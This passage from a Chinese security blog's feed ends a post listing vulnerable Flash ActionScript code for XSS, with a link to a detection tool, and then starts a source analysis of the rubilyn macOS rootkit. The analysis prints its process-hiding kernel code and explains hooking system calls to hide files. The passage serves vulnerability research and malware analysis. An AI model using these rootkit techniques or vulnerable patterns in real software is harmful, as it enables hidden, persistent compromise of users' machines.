&lt;h3 id=&quot;漏洞四&quot;&gt;&lt;a href=&quot;#漏洞四&quot; class=&quot;headerlink&quot; title=&quot;漏洞四&quot;&gt;&lt;/a&gt;漏洞四&lt;/h3&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;this.loadXML(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function init(file, ploader, bookmark, contentpath)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;container.init(csConfigFile, preloader_mc, csFilesetBookmark, contentpath);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var csConfigFile;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞五&quot;&gt;&lt;a href=&quot;#漏洞五&quot; class=&quot;headerlink&quot; title=&quot;漏洞五&quot;&gt;&lt;/a&gt;漏洞五&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;    getURL(_loc2, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.playList.currentClip().getLinkWindow());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _loc2 = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.playList.currentClip().getLinkURL();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _loc1.getLinkURL = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.linkUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _loc1 = (_global.org.flowplayer.playlist.Clip = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(name, baseUrl, fileName, start, end, protected, enableControl, linkUrl, linkWindow, type, allowResize, overlayFileName, overlayId, live, showOnLoadBegin, maxPlayCount, info, thumbnailUrl, suggestedClipsInfoUrl, id, keywords)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.linkUrl = linkUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ｝&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞六&quot;&gt;&lt;a href=&quot;#漏洞六&quot; class=&quot;headerlink&quot; title=&quot;漏洞六&quot;&gt;&lt;/a&gt;漏洞六&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.textField.htmlText = [&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, content, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;].join(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;_global.sIFR = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(textField, content)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;  ……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	   &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.write(content);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  	   ……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     sIFR.instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; sIFR(_loc3.txtF, _loc4);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     _loc4 = sIFR.VERSION_WARNING.split(&lt;span class=&quot;string&quot;&gt;&quot;%s&quot;&lt;/span&gt;).join(_root.version);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞七&quot;&gt;&lt;a href=&quot;#漏洞七&quot; class=&quot;headerlink&quot; title=&quot;漏洞七&quot;&gt;&lt;/a&gt;漏洞七&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._setVar(&lt;span class=&quot;string&quot;&gt;&quot;_onClick&quot;&lt;/span&gt;, [_root.onclick, pConfig.onclick], &lt;span class=&quot;string&quot;&gt;&quot;String&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;getURL(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._onClick, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._onClickTarget);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;自动化检测脚本&quot;&gt;&lt;a href=&quot;#自动化检测脚本&quot; class=&quot;headerlink&quot; title=&quot;自动化检测脚本&quot;&gt;&lt;/a&gt;自动化检测脚本&lt;/h3&gt;&lt;p&gt;顺手写了个简单的检测已知漏洞的flash xss检测脚本，下载地址见 &lt;a href=&quot;https://github.com/riusksk/FlashScanner&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FlashScanner&lt;/a&gt;：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/flash_xss/checker.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;


</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;漏洞一&quot;&gt;&lt;a href=&quot;#漏洞一&quot; class=&quot;headerlink&quot; title=&quot;漏洞一&quot;&gt;&lt;/a&gt;漏洞一&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Flash" scheme="http://riusksk.github.io/tags/Flash/"/>
    
      <category term="XSS" scheme="http://riusksk.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX rootkit rubilyn 源码分析</title>
    <link href="http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/"/>
    <id>http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/</id>
    <published>2012-12-31T16:00:00.000Z</published>
    <updated>2016-06-22T05:17:56.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* modify allproc to hide a specific pid */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hideproc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (p = my_allproc-&amp;gt;lh_first; p != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; p = p-&amp;gt;p_list.le_next) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid == p-&amp;gt;p_pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(hidden_p_count &amp;lt; MAX_HIDDEN_PROCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p[hidden_p_count]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p_count++;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_lock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    LIST_REMOVE(p, p_list); 	&lt;span class=&quot;comment&quot;&gt;// 移除p_list结构中关于p进程的元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_unlock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;2、隐藏文件&quot;&gt;&lt;a href=&quot;#2、隐藏文件&quot; class=&quot;headerlink&quot; title=&quot;2、隐藏文件&quot;&gt;&lt;/a&gt;2、隐藏文件&lt;/h3&gt;&lt;p&gt;为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：&lt;/p&gt;
&lt;figure class=&quot;highlight d&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk&lt;span class=&quot;keyword&quot;&gt;@macosx&lt;/span&gt;:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::entry&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   printf(&lt;span class=&quot;string&quot;&gt;&quot;=%d\n&quot;&lt;/span&gt;, arg1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是查看finder进程2841的调用函数：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p 2841 | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &#39;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&#39; matched 573227 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1078881          getdirentriesattr:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1363229         getdirentriesattr:return =1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是ls命令(64位系统)调用的函数：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &amp;apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&amp;apos; matched 28745 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: pid 3184 has exited&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =1980&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sysent &amp;#123; &lt;span class=&quot;comment&quot;&gt;/* system call table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int16_t&lt;/span&gt; sy_narg; &lt;span class=&quot;comment&quot;&gt;/* number of args */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_resv; &lt;span class=&quot;comment&quot;&gt;/* reserved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_flags; &lt;span class=&quot;comment&quot;&gt;/* flags */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_call_t&lt;/span&gt; *sy_call; &lt;span class=&quot;comment&quot;&gt;/* implementing function */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge32; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 32-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge64; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 64-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; sy_return_type; &lt;span class=&quot;comment&quot;&gt;/* system call return types */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; sy_arg_bytes; &lt;span class=&quot;comment&quot;&gt;/* Total size of arguments in bytes for* 32-bit system calls */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries  196&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentriesattr 222&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries64 344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
